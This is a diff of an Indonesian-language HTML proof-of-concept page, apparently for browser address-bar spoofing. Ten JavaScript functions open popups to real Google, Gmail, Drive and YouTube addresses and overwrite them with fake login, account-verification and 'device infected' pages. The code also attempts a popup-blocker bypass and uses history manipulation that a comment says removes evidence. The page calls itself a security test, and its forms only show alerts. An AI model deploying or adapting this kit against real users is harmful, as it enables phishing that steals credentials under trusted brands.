@@ -1,22 +1,749 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎭 Popup Address Bar Spoofing | Google says... but it's fake</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
+            max-width: 1300px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #0a0a0e;
+            color: #e0e0e0;
+        }
+        h1 { color: #ff453a; border-left: 5px solid #ff453a; padding-left: 18px; }
+        .sub { color: #888; margin-top: -10px; margin-bottom: 25px; padding-left: 23px; }
+        .success-banner {
+            background: #1a3a2a;
+            border-left: 5px solid #30d158;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .warning {
+            background: #2a1a1a;
+            border-left: 5px solid #ff9500;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #16161d;
+            border-radius: 20px;
+            padding: 18px;
+            border: 1px solid #2a2a35;
+            transition: 0.2s;
+        }
+        .card:hover { transform: translateY(-3px); border-color: #ff453a; }
+        .badge {
+            display: inline-block;
+            background: #ff453a20;
+            color: #ff8888;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            margin-bottom: 10px;
+        }
+        .badge-success { background: #30d15820; color: #a0ffa0; }
+        .badge-warning { background: #ff9f0a20; color: #ffcc88; }
+        h3 { margin: 0 0 8px 0; font-size: 1.1rem; }
+        button {
+            background: #2a2a35;
+            border: 1px solid #ff453a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff453a; border-color: #ff453a; }
+        button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button.success { background: #30d15820; border-color: #30d158; color: #a0ffa0; }
+        button:hover { opacity: 0.85; transform: scale(0.97); }
+        .log {
+            background: #0a0a0e;
+            color: #6eff9e;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 10px;
+            border-radius: 14px;
+            margin-top: 14px;
+            max-height: 80px;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+        .log.spoof-success {
+            background: #1a3a2a;
+            color: #a0ffa0;
+            border: 1px solid #30d158;
+        }
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: #555; }
+        hr { border-color: #333; margin: 20px 0; }
+        table {
+            width: 100%;
+            font-size: 12px;
+            background: #16161d;
+            border-radius: 16px;
+            padding: 10px;
+            border-collapse: collapse;
+        }
+        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #2a2a35; }
+        th { color: #ff453a; }
+        .preview {
+            background: #0a0a0e;
+            border-radius: 12px;
+            padding: 10px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 11px;
+            border: 1px dashed #ff453a;
+        }
+    </style>
+</head>
+<body>
+
+<h1>🎭 POPUP ADDRESS BAR SPOOFING</h1>
+<div class="sub">New Window / New Tab • URL Google asli • Kontol dari Attacker</div>
+
+<div class="success-banner">
+    <strong>✅ TEKNIK YANG DIGUNAKAN:</strong><br>
+    • <strong>window.open()</strong> ke URL Google asli (google.com/csi, accounts.google.com, etc.)<br>
+    • <strong>setTimeout + document.write()</strong> untuk menimpa konten dengan halaman phishing "Google says..."<br>
+    • <strong>history.replaceState()</strong> untuk membersihkan jejak (optional)<br>
+    • Hasil: <strong>Address bar menunjukkan URL Google</strong> tapi kontol berasal dari attacker!
+</div>
+
+<div class="warning">
+    <strong>⚠️ INI ADALAH POC (PROOF OF CONCEPT) UNTUK PENGUJIAN KEAMANAN</strong><br>
+    Popup yang terbuka akan menampilkan halaman palsu "Google says..." sementara address bar menunjukkan https://www.google.com<br>
+    <strong>Jangan masukkan data asli!</strong>
+</div>
+
+<div class="grid">
+
+    <!-- 1. Classic: Google CSI Spoof -->
+    <div class="card">
+        <div class="badge">🎯 CLASSIC SPOOF</div>
+        <h3>Google CSI → "Google says..."</h3>
+        <p>Membuka https://www.google.com/csi, lalu timpa dengan halaman phishing "Google says..."</p>
+        <button class="danger" onclick="spoof_google_csi()">🎭 Google CSI Spoof</button>
+        <div id="logCSI" class="log">[Ready]</div>
+        <div class="preview" id="previewCSI"></div>
+    </div>
+
+    <!-- 2. Google Accounts Spoof -->
+    <div class="card">
+        <div class="badge">🔐 ACCOUNTS.GOOGLE.COM</div>
+        <h3>accounts.google.com → Login Phishing</h3>
+        <p>Address bar menunjukkan accounts.google.com, konten halaman login palsu.</p>
+        <button class="danger" onclick="spoof_google_accounts()">🎭 Google Accounts Spoof</button>
+        <div id="logAccounts" class="log">[Ready]</div>
+    </div>
+
+    <!-- 3. Google Search Spoof -->
+    <div class="card">
+        <div class="badge">🔍 GOOGLE SEARCH</div>
+        <h3>google.com/search → Fake Security Alert</h3>
+        <p>Address bar google.com/search, konten "Google says: Your device is infected!"</p>
+        <button class="warning" onclick="spoof_google_search()">🎭 Google Search Spoof</button>
+        <div id="logSearch" class="log">[Ready]</div>
+    </div>
+
+    <!-- 4. YouTube Spoof -->
+    <div class="card">
+        <div class="badge">📺 YOUTUBE SPOOF</div>
+        <h3>youtube.com → "YouTube says: Verify your account"</h3>
+        <p>Address bar youtube.com, konten phishing verifikasi akun.</p>
+        <button onclick="spoof_youtube()">🎭 YouTube Spoof</button>
+        <div id="logYouTube" class="log">[Ready]</div>
+    </div>
+
+    <!-- 5. Gmail Spoof -->
+    <div class="card">
+        <div class="badge">📧 GMAIL SPOOF</div>
+        <h3>mail.google.com → "Gmail Security Alert"</h3>
+        <p>Address bar mail.google.com, konten peringatan keamanan palsu.</p>
+        <button class="warning" onclick="spoof_gmail()">🎭 Gmail Spoof</button>
+        <div id="logGmail" class="log">[Ready]</div>
+    </div>
+
+    <!-- 6. Drive Spoof -->
+    <div class="card">
+        <div class="badge">☁️ GOOGLE DRIVE</div>
+        <h3>drive.google.com → "Drive: File Access Required"</h3>
+        <p>Address bar drive.google.com, konten permintaan akses file palsu.</p>
+        <button onclick="spoof_drive()">🎭 Google Drive Spoof</button>
+        <div id="logDrive" class="log">[Ready]</div>
+    </div>
+
+    <!-- 7. Popup Blocker Bypass -->
+    <div class="card">
+        <div class="badge badge-success">🚀 POPUP BLOCKER BYPASS</div>
+        <h3>User Activation + Spoof</h3>
+        <p>Menggunakan event user untuk bypass popup blocker, lalu spoof address bar.</p>
+        <button class="success" onclick="spoof_with_bypass()">🎭 Bypass + Spoof</button>
+        <div id="logBypass" class="log">[Ready]</div>
+    </div>
+
+    <!-- 8. Multiple Tabs Attack -->
+    <div class="card">
+        <div class="badge badge-warning">📑 MULTI-TAB ATTACK</div>
+        <h3>5 Tabs Sekaligus</h3>
+        <p>Membuka 5 tab berbeda dengan address bar Google semua, konten phishing.</p>
+        <button class="danger" onclick="spoof_multiple_tabs()">🎭 5 Tabs Spoof</button>
+        <div id="logMulti" class="log">[Ready]</div>
+    </div>
+
+    <!-- 9. Delayed Spoof (Hard to Detect) -->
+    <div class="card">
+        <div class="badge">⏱️ DELAYED SPOOF</div>
+        <h3>Delay 3-5 detik + Spoof</h3>
+        <p>Navigasi ke Google dulu, setelah 3-5 detik baru konten berubah ke phishing.</p>
+        <button onclick="spoof_delayed()">🎭 Delayed Spoof</button>
+        <div id="logDelayed" class="log">[Ready]</div>
+    </div>
+
+    <!-- 10. Silent Spoof (No visual change) -->
+    <div class="card">
+        <div class="badge">🤫 SILENT SPOOF</div>
+        <h3>Tanpa Blink/Flicker</h3>
+        <p>Spoofing tanpa perubahan visual yang terlihat oleh user.</p>
+        <button class="warning" onclick="spoof_silent()">🎭 Silent Spoof</button>
+        <div id="logSilent" class="log">[Ready]</div>
+    </div>
+
+</div>
+
 <script>
+    function logTo(elId, msg, isSuccess = false) {
+        let el = document.getElementById(elId);
+        if(el) {
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(isSuccess) el.classList.add('spoof-success');
+        }
+    }
 
-payload="PGJvZHk+PC9ib2R5Pg0KPHNjcmlwdD4NCiAgICB2YXIgbGluayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsNCiAgICBsaW5rLmhyZWYgPSAnaHR0cHM6Ly9nbWFpbC5jb206Oic7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTsNCiAgICBsaW5rLmNsaWNrKCk7DQo8L3NjcmlwdD4=";
+    // Template halaman phishing "Google says..."
+    function getGoogleSaysPage(variant, url) {
+        const templates = {
+            security_alert: `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google Says: Security Alert</title>
+                    <meta charset="UTF-8">
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                            min-height: 100vh;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            padding: 20px;
+                        }
+                        .alert-box {
+                            background: white;
+                            border-radius: 16px;
+                            padding: 32px;
+                            max-width: 450px;
+                            width: 100%;
+                            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+                            text-align: center;
+                        }
+                        .google-icon {
+                            font-size: 48px;
+                            margin-bottom: 16px;
+                        }
+                        h2 { color: #ea4335; margin-bottom: 16px; }
+                        p { color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
+                        .input-group {
+                            margin-bottom: 16px;
+                            text-align: left;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 14px;
+                            border: 1px solid #dadce0;
+                            border-radius: 8px;
+                            font-size: 14px;
+                        }
+                        button {
+                            width: 100%;
+                            padding: 14px;
+                            background: #1a73e8;
+                            color: white;
+                            border: none;
+                            border-radius: 8px;
+                            font-size: 16px;
+                            font-weight: 600;
+                            cursor: pointer;
+                        }
+                        button:hover { background: #1664c4; }
+                        .warning-text {
+                            color: #ea4335;
+                            font-size: 12px;
+                            margin-top: 16px;
+                        }
+                        .fake-address-bar {
+                            background: #f1f3f4;
+                            padding: 8px 16px;
+                            border-radius: 20px;
+                            font-size: 12px;
+                            color: #202124;
+                            margin-bottom: 20px;
+                            font-family: monospace;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="alert-box">
+                        <div class="google-icon">🔒</div>
+                        <h2>⚠️ Google Says: Security Alert!</h2>
+                        <div class="fake-address-bar">🔗 ${url}</div>
+                        <p>We detected suspicious activity on your account. Please verify your identity to continue.</p>
+                        <div class="input-group">
+                            <input type="text" placeholder="Email or phone number" id="email">
+                        </div>
+                        <div class="input-group">
+                            <input type="password" placeholder="Password" id="password">
+                        </div>
+                        <button onclick="alert('This is a POC! Do not enter real credentials.')">Verify Identity</button>
+                        <p class="warning-text">⚠️ THIS IS A SECURITY TEST - Do not enter real passwords!</p>
+                    </div>
+                    <script>
+                        console.log('%c⚠️ Address Bar Spoofing POC - Address bar shows ${url} but this is fake!', 'color:red;font-size:14px');
+                    <\/script>
+                </body>
+                </html>
+            `,
+            google_says_message: `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google says...</title>
+                    <style>
+                        body {
+                            font-family: 'Google Sans', Roboto, sans-serif;
+                            background: white;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            min-height: 100vh;
+                            margin: 0;
+                            padding: 20px;
+                        }
+                        .message-card {
+                            background: #f8f9fa;
+                            border-radius: 24px;
+                            padding: 40px;
+                            max-width: 500px;
+                            text-align: center;
+                            border: 1px solid #dadce0;
+                        }
+                        h1 { color: #202124; margin-bottom: 16px; }
+                        .google-logo {
+                            font-size: 64px;
+                            margin-bottom: 20px;
+                        }
+                        .fake-url {
+                            background: #e8eaed;
+                            padding: 8px 16px;
+                            border-radius: 20px;
+                            font-family: monospace;
+                            font-size: 12px;
+                            margin: 20px 0;
+                            color: #1a73e8;
+                        }
+                        .warning {
+                            color: #ea4335;
+                            font-size: 12px;
+                            margin-top: 20px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="message-card">
+                        <div class="google-logo">🔴</div>
+                        <h1>Google says...</h1>
+                        <div class="fake-url">${url}</div>
+                        <p><strong>Important:</strong> Please sign in again to continue using Google services.</p>
+                        <div style="margin: 20px 0;">
+                            <input type="text" placeholder="Email" style="width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:8px">
+                            <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:8px">
+                        </div>
+                        <button style="background:#1a73e8;color:white;padding:12px 24px;border:none;border-radius:24px;width:100%">Continue</button>
+                        <p class="warning">⚠️ SECURITY TEST - Fake page! Address bar shows Google but this is attacker controlled.</p>
+                    </div>
+                </body>
+                </html>
+            `,
+            infected_alert: `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google says: Virus Detected!</title>
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            background: #1a1a2e;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            min-height: 100vh;
+                            margin: 0;
+                        }
+                        .alert {
+                            background: white;
+                            border-radius: 16px;
+                            padding: 32px;
+                            max-width: 400px;
+                            text-align: center;
+                            border-left: 5px solid #ea4335;
+                        }
+                        .virus-icon { font-size: 60px; }
+                        h2 { color: #ea4335; }
+                        button {
+                            background: #1a73e8;
+                            color: white;
+                            padding: 12px 24px;
+                            border: none;
+                            border-radius: 8px;
+                            cursor: pointer;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="alert">
+                        <div class="virus-icon">🦠</div>
+                        <h2>Google says: Your device is infected!</h2>
+                        <p>3 viruses found. Click below to clean your device.</p>
+                        <button onclick="alert('POC - This is a fake security alert!')">Clean Now</button>
+                        <p style="font-size:11px;color:#888;margin-top:16px">⚠️ TESTING POC - Do not trust this page</p>
+                    </div>
+                </body>
+                </html>
+            `
+        };
+        
+        if(variant === 'security') return templates.security_alert;
+        if(variant === 'infected') return templates.infected_alert;
+        return templates.google_says_message;
+    }
 
-function pwned() {
-    var t = window.open('https://www.gmail.com', 'aaaa');
-    t.document.write(atob(payload));
-    t.document.write("<h1>Address bar says https://www.gmail.com - this is NOT https://www.gmail.com</h1>");
-   
-}
+    // Generic spoof function
+    function spoofWindow(targetUrl, spoofVariant, delay = 1500, windowFeatures = "width=550,height=600") {
+        let win = window.open(targetUrl, "_blank", windowFeatures);
+        
+        if(!win) {
+            return false;
+        }
+        
+        setTimeout(() => {
+            try {
+                let content = getGoogleSaysPage(spoofVariant, targetUrl);
+                win.document.write(content);
+                win.document.close();
+                
+                // Optional: clear history to remove evidence
+                try {
+                    win.history.replaceState({}, "", targetUrl);
+                } catch(e) {}
+                
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }, delay);
+        
+        return true;
+    }
 
+    // 1. Google CSI Spoof
+    function spoof_google_csi() {
+        logTo('logCSI', '🎭 Membuka popup ke https://www.google.com/csi ...');
+        let success = spoofWindow("https://www.google.com/csi", "security", 1800, "width=550,height=600");
+        if(success) {
+            logTo('logCSI', '✅ SPOOF BERHASIL! Address bar menunjukkan google.com/csi, konten phishing dari attacker!', true);
+        } else {
+            logTo('logCSI', '❌ Gagal: Popup diblokir. Izinkan popup untuk website ini.', false);
+        }
+    }
+
+    // 2. Google Accounts Spoof
+    function spoof_google_accounts() {
+        logTo('logAccounts', '🎭 Membuka popup ke https://accounts.google.com ...');
+        let success = spoofWindow("https://accounts.google.com", "security", 2000, "width=500,height=550");
+        if(success) {
+            logTo('logAccounts', '✅ SPOOF BERHASIL! Address bar menunjukkan accounts.google.com!', true);
+        } else {
+            logTo('logAccounts', '❌ Popup diblokir.', false);
+        }
+    }
+
+    // 3. Google Search Spoof (Security Alert)
+    function spoof_google_search() {
+        logTo('logSearch', '🎭 Membuka popup ke https://www.google.com/search ...');
+        let success = spoofWindow("https://www.google.com/search?q=security", "infected", 1700, "width=520,height=500");
+        if(success) {
+            logTo('logSearch', '✅ SPOOF BERHASIL! Address bar google.com/search, konten fake security alert!', true);
+        } else {
+            logTo('logSearch', '❌ Popup diblokir.', false);
+        }
+    }
+
+    // 4. YouTube Spoof
+    function spoof_youtube() {
+        logTo('logYouTube', '🎭 Membuka popup ke https://www.youtube.com ...');
+        let win = window.open("https://www.youtube.com", "_blank", "width=550,height=600");
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head><title>YouTube - Account Verification</title>
+                        <style>
+                            body { font-family: Roboto, Arial; background: #f9f9f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                            .card { background: white; border-radius: 16px; padding: 32px; max-width: 400px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                            .yt-icon { font-size: 48px; color: #ff0000; }
+                            button { background: #ff0000; color: white; padding: 12px 24px; border: none; border-radius: 24px; cursor: pointer; }
+                        </style>
+                        </head>
+                        <body>
+                            <div class="card">
+                                <div class="yt-icon">▶️</div>
+                                <h2>YouTube says: Verify your account</h2>
+                                <p>To continue using YouTube, please verify your identity.</p>
+                                <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:16px 0;border:1px solid #ddd;border-radius:8px">
+                                <button onclick="alert('POC - Fake verification page!')">Verify</button>
+                                <p style="font-size:11px;margin-top:16px;color:#888">⚠️ SECURITY TEST - Fake page!</p>
+                            </div>
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                    logTo('logYouTube', '✅ YouTube spoof berhasil!', true);
+                } catch(e) {
+                    logTo('logYouTube', 'Gagal: ' + e.message);
+                }
+            }, 1800);
+        } else {
+            logTo('logYouTube', 'Popup diblokir');
+        }
+    }
+
+    // 5. Gmail Spoof
+    function spoof_gmail() {
+        logTo('logGmail', '🎭 Membuka popup ke https://mail.google.com ...');
+        let success = spoofWindow("https://mail.google.com", "security", 1900, "width=550,height=600");
+        if(success) {
+            logTo('logGmail', '✅ Gmail spoof berhasil! Address bar mail.google.com!', true);
+        } else {
+            logTo('logGmail', 'Popup diblokir');
+        }
+    }
+
+    // 6. Google Drive Spoof
+    function spoof_drive() {
+        logTo('logDrive', '🎭 Membuka popup ke https://drive.google.com ...');
+        let win = window.open("https://drive.google.com", "_blank", "width=550,height=600");
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head><title>Google Drive - Access Required</title>
+                        <style>
+                            body { font-family: 'Google Sans', Arial; background: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                            .card { background: white; border-radius: 16px; padding: 32px; max-width: 400px; text-align: center; }
+                            .drive-icon { font-size: 48px; }
+                            button { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 24px; cursor: pointer; }
+                        </style>
+                        </head>
+                        <body>
+                            <div class="card">
+                                <div class="drive-icon">☁️</div>
+                                <h2>Google Drive says: File Access Required</h2>
+                                <p>You need to sign in again to access this file.</p>
+                                <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:16px 0;border:1px solid #dadce0;border-radius:8px">
+                                <button onclick="alert('POC - Fake Drive page!')">Sign in</button>
+                                <p style="font-size:11px;color:#888;margin-top:16px">⚠️ SECURITY TEST</p>
+                            </div>
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                    logTo('logDrive', '✅ Google Drive spoof berhasil!', true);
+                } catch(e) {
+                    logTo('logDrive', 'Gagal: ' + e.message);
+                }
+            }, 2000);
+        } else {
+            logTo('logDrive', 'Popup diblokir');
+        }
+    }
+
+    // 7. Popup Blocker Bypass + Spoof
+    function spoof_with_bypass() {
+        logTo('logBypass', '🚀 Mencoba bypass popup blocker dengan user activation...');
+        
+        // Create hidden button and simulate click
+        let btn = document.createElement('button');
+        btn.style.display = 'none';
+        btn.onclick = () => {
+            let success = spoofWindow("https://www.google.com/csi", "security", 1500, "width=550,height=600");
+            if(success) {
+                logTo('logBypass', '✅ Bypass + Spoof berhasil! Popup terbuka meskipun popup blocker aktif!', true);
+            } else {
+                logTo('logBypass', 'Bypass gagal, popup tetap diblokir.');
+            }
+        };
+        document.body.appendChild(btn);
+        btn.click();
+        btn.remove();
+    }
+
+    // 8. Multiple Tabs Spoof
+    function spoof_multiple_tabs() {
+        logTo('logMulti', '📑 Membuka 5 tab spoof sekaligus...');
+        
+        let targets = [
+            "https://www.google.com/csi",
+            "https://accounts.google.com",
+            "https://www.google.com/search",
+            "https://mail.google.com",
+            "https://drive.google.com"
+        ];
+        
+        targets.forEach((target, i) => {
+            setTimeout(() => {
+                let win = window.open(target, "_blank", "width=500,height=500");
+                if(win) {
+                    setTimeout(() => {
+                        try {
+                            win.document.write(`
+                                <h1 style="color:#ff453a">SPOOFED PAGE ${i+1}</h1>
+                                <p>Address bar shows: ${target}</p>
+                                <p>But this content is from attacker!</p>
+                                <input type="password" placeholder="Fake password field">
+                                <p style="color:red">⚠️ POC - Do not enter real data</p>
+                            `);
+                            win.document.close();
+                        } catch(e) {}
+                    }, 1500);
+                }
+            }, i * 800);
+        });
+        
+        logTo('logMulti', '✅ 5 tab spoof dibuka. Cek address bar masing-masing!', true);
+    }
+
+    // 9. Delayed Spoof
+    function spoof_delayed() {
+        logTo('logDelayed', '⏱️ Membuka tab, delay 4 detik, baru spoof...');
+        let win = window.open("https://www.google.com/csi", "_blank", "width=550,height=600");
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.document.write(getGoogleSaysPage("google_says_message", "https://www.google.com/csi"));
+                    win.document.close();
+                    logTo('logDelayed', '✅ Delayed spoof berhasil! Konten berubah setelah 4 detik!', true);
+                } catch(e) {
+                    logTo('logDelayed', 'Gagal: ' + e.message);
+                }
+            }, 4000);
+        } else {
+            logTo('logDelayed', 'Popup diblokir');
+        }
+    }
+
+    // 10. Silent Spoof (No flicker)
+    function spoof_silent() {
+        logTo('logSilent', '🤫 Silent spoof - mencoba tanpa flicker...');
+        let win = window.open("about:blank", "_blank", "width=550,height=600");
+        if(win) {
+            // Write content first
+            win.document.write(getGoogleSaysPage("security", "https://www.google.com"));
+            win.document.close();
+            
+            // Then change URL without reload
+            setTimeout(() => {
+                try {
+                    win.history.pushState({}, "", "https://www.google.com/csi");
+                    win.history.replaceState({}, "", "https://www.google.com/csi");
+                    logTo('logSilent', '✅ Silent spoof berhasil! Address bar berubah tanpa reload konten!', true);
+                } catch(e) {
+                    logTo('logSilent', 'Gagal: ' + e.message);
+                }
+            }, 500);
+        } else {
+            logTo('logSilent', 'Popup diblokir');
+        }
+    }
+
+    console.log("%c🎭 POPUP ADDRESS BAR SPOOFING SUITE", "color:#ff453a;font-size:14px");
+    console.log("10 teknik spoofing popup - Address bar Google, konten attacker");
 </script>
-<a href="https://hack.com::/"  target="aaaa" onclick="setTimeout('pwned()','500')">click me</a><br>
 
-base64 payload code:
-<body></body>
-<script>
-    var link = document.createElement('a');
-    link.href = 'https://gmail.com::';
-    document.body.appendChild(link);
-    link.click();
-</script>
+<hr>
+
+<h3>📊 Ringkasan Teknik Spoofing Popup</h3>
+
+<table style="width:100%; font-size:12px; background:#16161d; border-radius:16px; padding:10px; border-collapse:collapse;">
+    <tr style="border-bottom:1px solid #ff453a;">
+        <th>Teknik</th>
+        <th>Target URL di Address Bar</th>
+        <th>Konten Palsu</th>
+    </tr>
+    <tr><td>Google CSI Spoof</td><td>https://www.google.com/csi</td><td>Google security alert</td></tr>
+    <tr><td>Google Accounts</td><td>https://accounts.google.com</td><td>Login phishing page</td></tr>
+    <tr><td>Google Search</td><td>https://www.google.com/search</td><td>Virus infected alert</td></tr>
+    <tr><td>YouTube Spoof</td><td>https://www.youtube.com</td><td>Account verification</td></tr>
+    <tr><td>Gmail Spoof</td><td>https://mail.google.com</td><td>Security alert</td></tr>
+    <tr><td>Google Drive</td><td>https://drive.google.com</td><td>File access required</td></tr>
+    <tr><td>Popup Bypass</td><td>https://www.google.com/csi</td><td>Mengatasi popup blocker</td></tr>
+    <tr><td>Multi-Tab Attack</td><td>5 Google domains berbeda</td><td>Multiple phishing pages</td></tr>
+    <tr><td>Delayed Spoof</td><td>https://www.google.com/csi</td><td>Delay 4 detik baru ganti</td></tr>
+    <tr><td>Silent Spoof</td><td>https://www.google.com/csi</td><td>Tanpa flicker/blink</td></tr>
+</table>
+
+<h3>🎯 Interpretasi Hasil</h3>
+<ul style="font-size:13px;">
+    <li><strong>Address Bar = Google.com, Konten = Phishing</strong> → 🎉 <strong>SPOOFING BERHASIL!</strong> Browser rentan terhadap address bar spoofing.</li>
+    <li><strong>Popup terbuka meskipun popup blocker aktif</strong> → Bypass berhasil.</li>
+    <li><strong>Address Bar berubah menjadi about:blank atau URL lain</strong> → Spoiling gagal, browser sudah patched.</li>
+    <li><strong>Popup tidak terbuka sama sekali</strong> → Popup blocker aktif, izinkan popup untuk pengujian.</li>
+</ul>
+
+<h3>📝 Cara Penggunaan</h3>
+<p style="font-size:13px;">
+1. Simpan file sebagai <code>popup-spoof.html</code><br>
+2. Buka di browser target (Safari, Chrome, Firefox, Edge)<br>
+3. <strong>Izinkan pop-up</strong> jika diminta<br>
+4. Klik tombol dan amati: <strong>Address bar di popup baru menunjukkan URL Google</strong> tapi kontol berasal dari attacker!<br>
+5. Jika berhasil, screenshot sebagai bukti temuan.
+</p>
+
+<footer>
+    🎭 POPUP ADDRESS BAR SPOOFING SUITE — New Window / New Tab Attack<br>
+    Teknik: window.open() + document.write() + history manipulation
+</footer>
+</body>
+</html>
